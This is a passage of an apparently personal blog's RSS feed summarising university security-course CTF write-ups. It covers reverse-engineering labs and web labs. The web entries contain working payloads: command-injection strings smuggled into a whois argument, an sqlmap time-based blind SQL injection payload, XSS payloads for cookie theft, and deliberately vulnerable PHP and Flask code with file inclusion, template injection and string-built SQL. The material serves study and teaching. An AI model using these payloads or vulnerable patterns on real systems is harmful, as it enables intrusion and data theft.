1)], [('sub', 10144), ('lsh', 8), ('lsh', 5), ('lsh', 1), ('lsh', 8)], [('add', 49937), ('lsh', 2), ('add', 60982), ('sub', 24799)], [('lsh', 4), ('add', 53340), ('add', 50619), ('sub', 56111), ('add', 6134), ('lsh', 1)], [('sub', 22577), ('sub', 50645)], [('add', 21265), ('sub', 41440)], [('add', 63314), ('sub', 45755), ('add', 62216)], [('sub', 52616)], [('add', 21192)], [('add', 62573), ('sub',18811)], [('add', 35452), ('sub', 11573), ('sub', 49079), ('sub', 36361), ('sub', 26862), ('lsh', 9)], [('add', 13610), ('lsh', 7), ('lsh', 3), ('sub', 28490), ('lsh', 10), ('add', 44742)], [('lsh', 10), ('sub', 1797), ('sub', 10564), ('add', 12394)], [('add', 45165), ('lsh', 10), ('sub', 60610), ('sub', 63002), ('sub', 14851), ('lsh', 1)], [('add', 34840), ('lsh', 3), ('sub', 16907)], [('add', 4404), ('lsh', 3), ('lsh', 7), ('lsh', 6)], [('lsh', 6), ('add', 51738), ('sub', 24621), ('add', 58646)], [('lsh', 1)], [('add', 29375), ('sub', 419), ('add', 2854), ('sub', 11878), ('lsh', 10), ('add', 40151)], [('add', 22953)]] print("Scrambled Result:", scrambled_result) # [4294946431, 4278905078, 1286912, 4294906624, 17060, 4294661164, 4294429720, 94573, 4294924666, 4294901787, 4294868383, 4294886344, 86147072, 47247259, 4294910851, 4294833676, 4294911813, 3040, 4294951460, 2160, 171843584, 4734127, 27100, 4294883864, 884998144, 236375, 111420, 4294894192, 4294947222, 79889, 4294914775, 21308, 43873, 4249743360, 1477674694, 113697, 92442178, 262757, 295239680, 91843, 210, 20569303, 23078] ::: :::spoiler output.txt</description></item><item><title>Simple Reverse - 0x28(2023 Lab - Super Angry)</title><link>https://bernie6401.github.io/security/course/ntu-cs/reverse/simple-reverse---0x282023-lab---super-angry/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/reverse/simple-reverse---0x282023-lab---super-angry/index.html</guid><description>Simple Reverse - 0x28(2023 Lab - Super Angry) Source code :::spoiler main function
__int64 __fastcall main(int argc, char **argv, char **a3) { __int64 *user_input; // rcx __int64 v5; // rdx __int64 v6; // rdx char output[128]; // [rsp+10h] [rbp-B0h] BYREF __int64 user_input_cp[6]; // [rsp+90h] [rbp-30h] BYREF user_input_cp[5] = __readfsqword(0x28u); if ( argc == 2 ) { user_input = (__int64 *)argv[1]; v5 = user_input[1]; user_input_cp[0] = *user_input; user_input_cp[1] = v5; v6 = user_input[3]; user_input_cp[2] = user_input[2]; user_input_cp[3] = v6; scramble_fn((__int64)user_input_cp, output, 0x20uLL); if ( !memcmp(output, verify_key, 0x80uLL) ) puts("Correct!"); else puts("Incorrect!"); return 0LL; } else { printf("Usage: %s &lt;input>\n", *argv); return 1LL; } } :::</description></item><item><title>Simple Reverse - 0x29(2023 Lab - Unpackme)</title><link>https://bernie6401.github.io/security/course/ntu-cs/reverse/simple-reverse---0x292023-lab---unpackme/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/reverse/simple-reverse---0x292023-lab---unpackme/index.html</guid><description>Simple Reverse - 0x29(2023 Lab - Unpackme) Source code ... LOAD:0000000000005AE8 mov rdi, [rsp+18h+start] ; start LOAD:0000000000005AED push 5 LOAD:0000000000005AEF pop rdx ; prot LOAD:0000000000005AF0 push 0Ah LOAD:0000000000005AF2 pop rax LOAD:0000000000005AF3 syscall ; LINUX - sys_mprotect LOAD:0000000000005AF5 jmp r13 LOAD:0000000000005AF5 LOAD:0000000000005AF5 sub_5A7C endp LOAD:0000000000005AF5 LOAD:0000000000005AF8 ; --------------------------------------------------------------------------- LOAD:0000000000005AF8 LOAD:0000000000005AF8 loc_5AF8: ; CODE XREF: start+2↑p LOAD:0000000000005AF8 pop rbp LOAD:0000000000005AF9 call sub_5A7C LOAD:0000000000005AF9 LOAD:0000000000005AF9 ; --------------------------------------------------------------------------- LOAD:0000000000005AFE aProcSelfExe db '/proc/self/exe',0 LOAD:0000000000005B0D align 2 LOAD:0000000000005B0E dw 1 LOAD:0000000000005B10 dq 81B00000C1100h, 0FFFFFF0000000200h, 7549F983004AE8E5h, 0FD374C8D48575344h, 0CE39482FEB5B565Eh, 0FFFFFBFF5E563273h LOAD:0000000000005B10 dq 778F3C0A72803CACh, 2C06740FFE7E8006h, 56161BE477013CE8h, 0FFBFFFFF75D028ADh, 0D801F829C80F5FDFh, 0C35BDFEBAC0312ABh LOAD:0000000000005B10 dq 8948505741564158h, 0DBFFEDFEEC8148E6h, 590A6A5F54591000h, 5003E8348A548F3h, 0B6AB48FE8949F875h, 0F60C0AFC0CCBB374h LOAD:0000000000005B10 dq 4DF5FF6EDFFE02FFh, 5E57370FFFBAFC29h, 50F58596AED7B8Ch, 0DFFF6FDB0579C085h, 8D49FD91580F6A0Eh, 0E741AAA00B0FF7Dh ... :::spoiler Real File main Function</description></item><item><title>Simple Reverse - 0x30(2023 HW - Evil FlagChecker)</title><link>https://bernie6401.github.io/security/course/ntu-cs/reverse/simple-reverse---0x302023-hw---evil-flagchecker/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/reverse/simple-reverse---0x302023-hw---evil-flagchecker/index.html</guid><description>Simple Reverse - 0x30(2023 HW - Evil FlagChecker) Background Anti Disassembly - 這一部分可以看一下碩一修的malware reverse的anti disassembly的修復(就是d和c的交錯使用) Anti Debugging - 首推scylla hide
Source code :::spoiler IDA main
int __cdecl main(int argc, const char **argv, const char **envp) { DWORD TickCount; // [esp+0h] [ebp-14h] unsigned int v5; // [esp+8h] [ebp-Ch] TickCount = GetTickCount(); Sleep(120000u); v5 = GetTickCount() - TickCount; if ( v5 &lt; 119950 || v5 > 120050 ) ExitProcess(0); ((void (*)(void))loc_401AE0)(); return 0; } ::: :::spoiler IDA loc_401AE0
.text:00401AE0 loc_401AE0: ; CODE XREF: _main:loc_4014AB↑p .text:00401AE0 push ebp .text:00401AE1 mov ebp, esp .text:00401AE3 lea esi, aHelloHacker ; "Hello Hacker" .text:00401AE9 mov al, 48h ; 'H' .text:00401AEB cmp [esi], al .text:00401AED jz short loc_401AF0 .text:00401AED .text:00401AED ; --------------------------------------------------------------------------- .text:00401AEF db 0E8h .text:00401AF0 ; --------------------------------------------------------------------------- .text:00401AF0 .text:00401AF0 loc_401AF0: ; CODE XREF: .text:00401AED↑j .text:00401AF0 nop word ptr [eax+eax+00000000h] .text:00401AF9 jmp short loc_401B01 .text:00401AF9 .text:00401AF9 ; --------------------------------------------------------------------------- .text:00401AFB db 48h ; H .text:00401AFC db 65h ; e .text:00401AFD db 6Ch ; l .text:00401AFE db 6Ch ; l .text:00401AFF db 6Fh ; o .text:00401B00 db 0 .text:00401B01 ; --------------------------------------------------------------------------- .text:00401B01 .text:00401B01 loc_401B01: ; CODE XREF: .text:00401AF9↑j .text:00401B01 jmp short loc_401B0E .text:00401B01 .text:00401B01 ; --------------------------------------------------------------------------- .text:00401B03 db 0E8h .text:00401B04 db 66h ; f .text:00401B05 db 0Fh .text:00401B06 db 1Fh .text:00401B07 db 84h .text:00401B08 db 0 .text:00401B09 db 0 .text:00401B0A db 0 .text:00401B0B db 0 .text:00401B0C byte_401B0C db 0 .text:00401B0D db 0E8h .text:00401B0E ; --------------------------------------------------------------------------- .text:00401B0E .text:00401B0E loc_401B0E: ; CODE XREF: .text:loc_401B01↑j .text:00401B0E jz short loc_401B13 .text:00401B0E .text:00401B10 jnz short loc_401B13 .text:00401B10 .text:00401B10 ; --------------------------------------------------------------------------- .text:00401B12 db 0E8h .text:00401B13 ; --------------------------------------------------------------------------- .text:00401B13 .text:00401B13 loc_401B13: ; CODE XREF: .text:loc_401B0E↑j .text:00401B13 ; .text:00401B10↑j .text:00401B13 push 1 .text:00401B15 jmp sub_401220 ::: :::spoiler IDA notify_debugger</description></item><item><title>Simple Reverse 0x06(Lab - AMessageBox)</title><link>https://bernie6401.github.io/security/course/ntu-cs/reverse/simple-reverse---0x06lab---amessagebox/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/reverse/simple-reverse---0x06lab---amessagebox/index.html</guid><description>Simple Reverse 0x06(Lab - AMessageBox) Background 組合語言ROL和RCL的區別
Recon 這一題其實以逆向的角度來說很簡單
先用DIE看一些資訊 發現有加UPX的殼，這件事情可以透過IDA更加確定 可以看到Function Name只有start然後反組譯的地方看起來很噁心，那應該就是在拆殼的步驟 先執行看看 需要輸入flag然後用一個message box噴錯 用x64-dbg 透過TA的講解，可以知道這一題不需要解殼，只需要用動態debugger看一下就可以了 我們知道題目有使用到message box的API，所以我們可以先鎖定該API在哪邊呼叫，再往回trace出他的判斷 我們可以利用符號的視窗看到這支程式有用到那些API Module(.dll)，而message box的API是在user32.dll，用下面的搜尋可以縮小範圍，但這個多種類的messagebox，具體來說是用哪一個也不知道，所以可以全選後都設立中斷點 剩下的就是跟一般debugger差不多的操作，當追到call messagebox之前的break point時，可以看一下call stack(呼叫堆疊)往前trace是誰呼叫了API，發現是00C7110B，點進去看一下可以明顯看到Correct/Wrong的字樣，所以可以判斷應該是這一段程式在判斷我們輸入的東西 分析判斷的程式 這裡就是要考驗耐心和不斷的觀察register的變化，認真看大概花個半小時就可以知道這一段在幹嘛(我就菜QAQ) 結論是中間的那些==重要的操作==其實就是左旋轉+XOR 0x87這樣而已，所以我們就可以開寫腳本了，把東西反著作回去就好了 Exploit import binascii enc_flag = [0xB5, 0xE5, 0x8D, 0xBD, 0x5C, 0x46, 0x36, 0x4E, 0x4E, 0x1E, 0x0E, 0x26, 0xA4, 0x1E, 0x0E, 0x4E, 0x46, 0x06, 0x16, 0xAC, 0xB4, 0x3E, 0x4E, 0x16, 0x94, 0x3E, 0x94, 0x8C, 0x94, 0x8C, 0x9C, 0x4E, 0xA4, 0x8C, 0x2E, 0x46, 0x8C, 0x6C] def pad(m): length = 0 if len(m) % 8 != 0: length = 8-len(m) % 8 return '0' * length + m FLAG = [] for i in range(len(enc_flag)): enc_flag[i] ^= 0x87 tmp = pad(bin(enc_flag[i])[2:]) tmp = hex(int(tmp[-3:] + tmp[:-3], 2)) FLAG.append(binascii.unhexlify(tmp[2:]).decode()) print("".join(FLAG)) Flag: FLAG{8699314d319802ef792b7babac9da58a}</description></item><item><title>Simple Reverse 0x08(Lab - GetProcAddress)</title><link>https://bernie6401.github.io/security/course/ntu-cs/reverse/simple-reverse---0x08lab---getprocaddress/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/reverse/simple-reverse---0x08lab---getprocaddress/index.html</guid><description>Simple Reverse 0x08(Lab - GetProcAddress) Background GetModuleFileNameA 函式 createFileA 函式 setFilePointer 函式 ReadFile 函式
Source Code :::spoiler IDA main function
int __cdecl main(int argc, const char **argv, const char **envp) { char *v3; // rdi __int64 i; // rcx char v6[32]; // [rsp+0h] [rbp-40h] BYREF char v7; // [rsp+40h] [rbp+0h] BYREF char lpFilename[304]; // [rsp+50h] [rbp+10h] BYREF char lpBuffer[136]; // [rsp+180h] [rbp+140h] BYREF char flag[64]; // [rsp+208h] [rbp+1C8h] BYREF __int64 File_HANDLE_VALUE; // [rsp+248h] [rbp+208h] int j; // [rsp+264h] [rbp+224h] v3 = &amp;v7; for ( i = 146i64; i; --i ) { *v3 = 0xCCCCCCCC; v3 += 4; } sub_140011375(&amp;unk_1400230B5); sub_1400113AC(); printf("Give me flag: "); scanf("%39s", flag); (GetModuleFileNameA_0)(0i64, lpFilename, 260i64); File_HANDLE_VALUE = (CreateFileA)( lpFilename, 0x80000000i64, FILE_SHARE_READ, 0i64, OPEN_EXISTING, FILE_ATTRIBUTE_NORMAL, 0i64); if ( File_HANDLE_VALUE == -1 || ((SetFilePointer)(File_HANDLE_VALUE, 0x4Ei64, 0i64, FILE_BEGIN), !(ReadFile)(File_HANDLE_VALUE, lpBuffer, 39i64, 0i64, 0i64)) ) { LABEL_11: puts("Wrong..."); } else { for ( j = 0; j &lt; 39; ++j ) { if ( (flag[j] ^ lpBuffer[j]) != byte_14001E000[8 * j] ) goto LABEL_11; } puts("Correct!!!"); } sub_140011311(v6, &amp;unk_14001BB18); return 0; } :::</description></item><item><title>Simple Reverse 0x11(Lab - Exception)</title><link>https://bernie6401.github.io/security/course/ntu-cs/reverse/simple-reverse---0x11lab---exception/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/reverse/simple-reverse---0x11lab---exception/index.html</guid><description>Simple Reverse 0x11(Lab - Exception) Background 乘法、除法的運用 — 組合語言筆記 try-except 陳述式
EXCEPTION_CONTINUE_EXECUTION (-1) 例外狀況已關閉。 在例外狀況發生的位置繼續執行。 EXCEPTION_CONTINUE_SEARCH 無法辨識 (0) 例外狀況。 繼續搜尋處理常式的堆疊，先搜尋包含 try-except 語句，然後針對具有下一個最高優先順序的處理常式。 EXCEPTION_EXECUTE_HANDLER 辨識 (1) 例外狀況。 藉由執行 __except 複合陳述式將控制權傳送至例外狀況處理常式，然後在 區塊之後 __except 繼續執行。 Source Code :::spoiler IDA Psuedo Code
int __cdecl main(int argc, const char **argv, const char **envp) { char Str[112]; // [rsp+20h] [rbp+0h] BYREF int i; // [rsp+A0h] [rbp+80h] printf("Give me flag: "); scanf("%s", Str); if ( strlen(Str) == 38 ) { for ( i = 0; i &lt; 38; ++i ) { if ( Str[i] != byte_14000A000[i] ) goto LABEL_7; } puts("Correct :>"); } else { LABEL_7: puts("Wrong :&lt;"); } return 0; } :::</description></item><item><title>Simple Reverse 0x12(Lab - TLSCallback)</title><link>https://bernie6401.github.io/security/course/ntu-cs/reverse/simple-reverse---0x12lab---tlscallback/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/reverse/simple-reverse---0x12lab---tlscallback/index.html</guid><description>Simple Reverse 0x12(Lab - TLSCallback) Background 課程相關影片 [C語言] function pointer的應用[四]: function pointer array
Source Code :::spoiler IDA main function
int __cdecl main(int argc, const char **argv, const char **envp) { __int64 v3; // rbx int v4; // edi __int64 v5; // r14 char *v6; // rsi __int64 v7; // rax const char *v8; // rcx printf("Give me flag: "); scanf("%58s"); v3 = 0i64; v4 = 0; v5 = 0i64; v6 = flag; do { (funcs_140001156[v4 % 3u])(&amp;flag[v5]); ++v6; v7 = v5 &amp; 3; ++v4; ++v5; *(v6 - 1) += key_140004050[v7]; } while ( v4 &lt; 58 ); while ( flag[v3] == byte_1400022B8[v3] ) { if ( ++v3 >= 58 ) { v8 = "Correct!"; goto LABEL_7; } } v8 = "Wrong QAO"; LABEL_7: puts(v8); return 0; } :::</description></item><item><title>Simple Reverse 0x13(Lab - Meow)</title><link>https://bernie6401.github.io/security/course/ntu-cs/reverse/simple-reverse---0x13lab---meow/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/reverse/simple-reverse---0x13lab---meow/index.html</guid><description>Simple Reverse 0x13(Lab - Meow) Background 課程影片 - Process Injection 一開始看真的看不太懂，只知道大概的邏輯，簡單來說應該是在原有的process中插入其他的process使其被執行，有以下幾種
DLL Injection APC Injection Early Bird APC Injection Process Hollowing Reflective DLL Injection Recon 其實這一題如果沒有TA先破哏，基本上我是直接放棄的，解題之前可以先看破哏教學 簡單來說這整支程式就是先把預先藏好的code解密出來，然後利用Process Hollowing的方式inject到原本的程式，而這支外插進來的code就會對我們輸入的flag進行一些操作，然後再跟他原本的encrypted flag進行比較。當我們知道這些事情之後，就可以開始分析了
先在IDA中找到隱藏的code解密的function 我是直接看TA教學的部分，不然我應該也找不出來，除非用x64dbg慢慢跟，具體來說是在main function中if statement的第二個function 跟進去後的sub_401550() :::spoiler Decrypt Hidden Code
__int64 sub_401550() { __int64 result; // rax unsigned int i; // [rsp+Ch] [rbp-4h] for ( i = 0; ; ++i ) { result = i; if ( i > 0x3FFF ) break; *(dword_404040 + i) += i % 7; *(dword_404040 + i) ^= byte_404020[i &amp; 7]; } return result; } :::</description></item><item><title>Simple Reverse 0x30(2023 HW - Baby Ransom 1)</title><link>https://bernie6401.github.io/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x302023-hw---baby-ransom-1/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x302023-hw---baby-ransom-1/index.html</guid><description>Simple Reverse 0x30(2023 HW - Baby Ransom 1) Background VirtualProtect 函式 記憶體保護常數 InternetOpenUrlA 函式 SetFileAttributesW 函式 Schtasks 工作排程 IsDebuggerPresent 函式 FindResourceA 函式 LoadResource 函式
Source code :::spoiler IDA Main Function
int __cdecl main(int argc, const char **argv, const char **envp) { // [COLLAPSED LOCAL DECLARATIONS. PRESS KEYPAD CTRL-"+" TO EXPAND] StackBase = NtCurrentTeb()->NtTib.StackBase; while ( 1 ) { DestInitValue = _InterlockedCompareExchange64(&amp;qword_140017050, StackBase, 0i64); if ( !DestInitValue ) { v5 = 0; goto LABEL_7; } if ( StackBase == DestInitValue ) break; Sleep(1000u); } v5 = 1; LABEL_7: if ( unk_140017058 == 1 ) { amsg_exit(31i64); } else if ( unk_140017058 ) { dword_140017008 = 1; } else { unk_140017058 = 1; initterm(&amp;qword_140019018, qword_140019028); } if ( unk_140017058 == 1 ) { initterm(&amp;qword_140019000, &amp;qword_140019010); unk_140017058 = 2; } if ( !v5 ) _InterlockedExchange64(&amp;qword_140017050, 0i64); if ( TlsCallback_0 ) TlsCallback_0(0i64, 2); sub_14000226B(); v6 = 0i64; qword_1400170E0 = SetUnhandledExceptionFilter(&amp;loc_140002530); (InterlockedExchange64)(nullsub_1); InitFloatUnit(); v7 = dword_140017028; space = malloc(8i64 * (dword_140017028 + 1)); v9 = qword_140017020; space_cp = space; while ( v7 > v6 ) { size = strlen(*(v9 + 8 * v6)) + 1; dest = malloc(size); *(space_cp + 8 * v6) = dest; src = *(v9 + 8 * v6++); qmemcpy(dest, src, size); } qword_140017020 = space_cp; if ( v7 &lt; 0 ) v7 = 0i64; *(space_cp + 8 * v7) = 0i64; sub_140001F1E(); _initenv = qword_140017018; dword_140017010 = (NetworkConfig_1DBB)(dword_140017028, qword_140017020);// 0x140017020 => 0x254CA9C1580 if ( !dword_14001700C ) exit(dword_140017010); if ( !dword_140017008 ) cexit(); return dword_140017010; } ::: :::spoiler IDA NetworkConfig_1DBB</description></item><item><title>Simple Reverse 0x31(2023 HW - Baby Ransom 2)</title><link>https://bernie6401.github.io/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x312023-hw---baby-ransom-2/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/reverse/winmalware-lab/simple-reverse---0x312023-hw---baby-ransom-2/index.html</guid><description>Simple Reverse 0x31(2023 HW - Baby Ransom 2) Background SystemFunction033 Source code :::spoiler IDA WinMain
int __stdcall WinMain(HINSTANCE hInstance, HINSTANCE hPrevInstance, LPSTR lpCmdLine, int nShowCmd) { HWND hWnd; // [rsp+60h] [rbp-A8h] WNDCLASSW WndClass; // [rsp+70h] [rbp-98h] BYREF struct tagMSG Msg; // [rsp+C0h] [rbp-48h] BYREF memset(&amp;WndClass, 0, sizeof(WndClass)); WndClass.lpfnWndProc = (WNDPROC)store_winword; WndClass.hInstance = hInstance; WndClass.lpszClassName = Caption; WndClass.hbrBackground = CreateSolidBrush(0); if ( !RegisterClassW(&amp;WndClass) ) return 1; hWnd = CreateWindowExW(0, Caption, Caption, 0xCF0000u, 100, 100, 800, 600, 0i64, 0i64, hInstance, 0i64); if ( !hWnd ) return 2; MainPayload(); ShowWindow(hWnd, nShowCmd); memset(&amp;Msg, 0, sizeof(Msg)); while ( GetMessageW(&amp;Msg, 0i64, 0, 0) ) { TranslateMessage(&amp;Msg); DispatchMessageW(&amp;Msg); } return 0; } ::: :::spoiler IDA MainPayload</description></item><item><title>Simple Web - 0x02(Lab - Whois Tool)</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x02lab---whois-tool/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x02lab---whois-tool/index.html</guid><description>Simple Web - 0x02(Lab - Whois Tool) tags: CTF Web eductf Challenge: https://whoistool.ctf.zoolab.org/
Background Almost the same as 0x10(Lab - DNS Lookup Tool | WAF)
Source Code &lt;?php if(isset($_GET["host"])){ $host = $_GET["host"]; if(strlen($host) > 15) echo "Host name tooooooo logn!!"; else echo `whois "{$host}" 2>&amp;1;`; } ?> Exploit Payload: ";ls -al;" Payload: ";cat flag.t*;" Then we got flag!!!</description></item><item><title>Simple Web - 0x03(Lab - Normal Login Panel (Flag 1))</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x03lab---normal-login-panel-flag-1/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x03lab---normal-login-panel-flag-1/index.html</guid><description>Simple Web - 0x03(Lab - Normal Login Panel (Flag 1)) tags: CTF Web eductf Challenge: https://login.ctf.zoolab.org/
Background Source Code Analysis Exploit - SQLi Easy way - SQLmap $ ./sqlmap.py "https://login.ctf.zoolab.org/" --form -dbs sqlite --dump --risk=3 --level=5 ... --- Parameter: username (POST) Type: time-based blind Title: SQLite > 2.0 AND time-based blind (heavy query) Payload: username='||(SELECT CHAR(116,86,90,89) WHERE 7681=7681 AND 7766=LIKE(CHAR(65,66,67,68,69,70,71),UPPER(HEX(RANDOMBLOB(500000000/2)))))||'&amp;password= --- Hard way - try&amp;error Check if it has sqli problem Payload: union'</description></item><item><title>Simple Web - 0x04(Lab - Normal Login Panel (Flag 2))</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x04lab---normal-login-panel-flag-2/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x04lab---normal-login-panel-flag-2/index.html</guid><description>Simple Web - 0x04(Lab - Normal Login Panel (Flag 2)) tags: CTF Web eductf Challenge: https://login.ctf.zoolab.org/
Background Web Security 0x1
Source Code :::spoiler code
from flask import Flask, request, render_template, render_template_string, send_file from flask_sqlalchemy import SQLAlchemy db = SQLAlchemy() app = Flask(__name__) app.config["SQLALCHEMY_DATABASE_URI"] = "sqlite:///app.db" db.init_app(app) with app.app_context(): db.session.execute(""" CREATE TABLE IF NOT EXISTS users( id Integer PRIMARY KEY, username String NOT NULL UNIQUE, password String, count Integer DEFAULT 0 ); """) db.session.execute("INSERT OR REPLACE INTO users (username, password) VALUES ('admin', 'FLAG{Un10N_s31eCt/**/F14g_fR0m_s3cr3t}')") db.session.commit() def login(greet): if not greet: return send_file('app.py', mimetype='text/plain') else: return render_template_string(f"Hello {greet}") @app.route('/', methods=["GET", "POST"]) def index(): if request.method == "GET": return render_template('index.html') else: username = request.form.get('username', '') password = request.form.get('password', '') error = '' user = db.session.execute("SELECT username, password FROM users where username=:username", {"username":username}).first() if user and user[1] == password: return login(request.form.get('greet', '')) elif not user: error += "User doesn't exist! " # New feature! count login failed event db.session.execute("UPDATE users SET count = count + 1 WHERE username=:username", {"username": username}) db.session.commit() count = db.session.execute(f"SELECT * FROM users WHERE username='{username}'").first() or [0, 0, 0, 0] error += f'Login faild count: {count[3]}' return render_template('index.html', error=error) if __name__ == "__main__": app.run(host="0.0.0.0") :::</description></item><item><title>Simple Web - 0x08(Lab - `Particles.js`)</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x08lab---particles.js/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x08lab---particles.js/index.html</guid><description>Simple Web - 0x08(Lab - Particles.js) tags: CTF Web eductf Challenge: https://particles.ctf.zoolab.org
Description The website can change the theme of layout. The main goal is to leak admin’s cookie.
Source Code Analysis Exploit - XSS Use burp suit to check if the website has XSS vulnerability. Try to modify config parameter Payload 1: 1;alert(123);console.log({x://\ :::spoiler Response 1
... &lt;script> url.value = location; config.value = '1; alert(123); console.log({x://\'; fetch('/1;alert(123);console.log({x://\.json').then(r => r.json()).then(json => { particlesJS("particles-js", json) }) &lt;/script> ... ::: or Payload 2: &lt;/script>&lt;script>alert(123);&lt;/script> :::spoiler Response 2</description></item><item><title>Simple Web - 0x09(Lab - Simple Note)</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x09lab---simple-note/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x09lab---simple-note/index.html</guid><description>Simple Web - 0x09(Lab - Simple Note) tags: CTF Web eductf Challenge: https://note.ctf.zoolab.org/
Background Source Code ... &lt;script> const id = location.pathname.split('/').pop(); fetch(`/api/note/${id}`).then(r => r.json()).then(({ title, content })=>{ url.value = location; titleNode.innerHTML = title; contentNode.innerText = content; }); &lt;/script> ... For instance, if our $id=47a8aad1b3b82dcd4decd36d, the script code will fetch this data as json file and parse title and content. Then it’ll change titleNode by innerHTML and change contentNode by innerText.</description></item><item><title>Simple Web 0x01(Lab - `gitleak`)</title><link>https://bernie6401.github.io/security/course/ntust-ws/information-leak/simple-web-0x01lab---gitleak/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/information-leak/simple-web-0x01lab---gitleak/index.html</guid><description>Simple Web 0x01(Lab - gitleak) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:9000/
Exploit - gitleak + basic Git command Use the extension of Firefox(or Google), Dotgit, to check if the website actually has git leak problem denny0223/scrabble To use scrabble tool to leak information
$ git clone https://github.com/denny0223/scrabble.git $ cd scrabble $ sudo ./scrabble http://h4ck3r.quest:9000/ Still no flag There’s flag.php but still no flag in there. HEAD said HEAD is now at a0228bd Remove flag. Thus, we can look up the history by the command below.</description></item><item><title>Simple Web 0x01(Lab - Hello from Windows 98)</title><link>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x01lab---hello-from-windows-98/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntu-cs/web/simple-web---0x01lab---hello-from-windows-98/index.html</guid><description>Simple Web 0x01(Lab - Hello from Windows 98) tags: CTF Web eductf Challenge: https://windows.ctf.zoolab.org/
Very similar to 0x07(Lab - HakkaMD)
Source code :::spoiler code
&lt;?php session_start(); if(isset($_GET['source'])){ highlight_file('./'.$_GET['source'].'.php'); die(); } if(isset($_GET['name']) &amp;&amp; $_GET['name']!=''){ $_SESSION['name'] = $_GET['name']; header("Location: /?page=hi.php"); die(); } if(!isset($_GET['page'])){ header("Location: /?page=say.php"); die(); } ?> &lt;!DOCTYPE html> &lt;html> &lt;head> &lt;title>Hello from Windows 98&lt;/title> &lt;meta charset="UTF-8" /> &lt;link rel="stylesheet" href="https://unpkg.com/98.css" /> &lt;/head> &lt;style> body{ background: url('blue.png'); background-size: cover; display: flex; align-items: center; justify-content: center; height: 100vh; margin: 0; } &lt;/style> &lt;/style> &lt;body> &lt;div class="window" style="margin: 32px; width: 500px"> &lt;div class="title-bar"> &lt;div class="title-bar-text"> Hello World.. &lt;/div> &lt;div class="title-bar-controls"> &lt;button aria-label="Minimize">&lt;/button> &lt;button aria-label="Maximize">&lt;/button> &lt;button aria-label="Close">&lt;/button> &lt;/div> &lt;/div> &lt;div class="window-body"> &lt;?php include($_GET['page']);?> &lt;/div> &lt;/div> &lt;/body> &lt;/html> :::</description></item><item><title>Simple Web 0x02(Lab - `.DS_Store`)</title><link>https://bernie6401.github.io/security/course/ntust-ws/information-leak/simple-web-0x02lab---.ds_store/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/information-leak/simple-web-0x02lab---.ds_store/index.html</guid><description>Simple Web 0x02(Lab - .DS_Store) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:9001/
Exploit - .DS_Store Clone lijiejie/ds_store_exp
$ git clone https://github.com/lijiejie/ds_store_exp.git $ python ds_store_exp.py http://h4ck3r.quest:9001/.DS_Store [200] http://h4ck3r.quest:9001/.DS_Store [200] http://h4ck3r.quest:9001/super_secret_meowmeow.php [200] http://h4ck3r.quest:9001/index.php $ cd h4ck3r.quest_9001 $ cat super_secret_meowmeow.php FLAG{.DS_Store is so annoying lmao} Note that, must install python 2, requests, ds_store and modify queue(import queue→import Queue as queue) $ conda create --name py2.7 python=2.7 $ conda install -c auto ds_store $ conda install -c anaconda requests Reference python-no-module-named-queue</description></item><item><title>Simple Web 0x03(Lab - Log me in + Revenge)</title><link>https://bernie6401.github.io/security/course/ntust-ws/sql-injection/simple-web-0x03lab---log-me-in-+-revenge/index.html</link><pubDate>Mon, 01 Jan 0001 00:00:00 +0000</pubDate><guid>https://bernie6401.github.io/security/course/ntust-ws/sql-injection/simple-web-0x03lab---log-me-in-+-revenge/index.html</guid><description>Simple Web 0x03(Lab - Log me in + Revenge) tags: NTUSTWS CTF Web Challenge: http://h4ck3r.quest:8200/ Challenge: 